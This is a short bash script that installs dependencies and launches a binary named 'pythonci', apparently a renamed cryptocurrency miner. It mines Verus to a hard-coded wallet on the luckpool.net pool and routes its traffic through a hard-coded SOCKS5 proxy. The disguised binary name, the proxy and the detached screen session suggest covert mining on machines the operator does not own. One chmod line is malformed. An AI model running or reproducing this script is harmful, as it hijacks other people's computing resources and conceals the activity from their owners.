#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x tole.sh && chmod +x pythonci chmod 777 pythonci tole.sh
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=R9LpRWVXVJhhmBctpKHvWvDc9x1hWXwXNv
WR=VIA-042
PY=socks5://104.248.48.172:30588
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
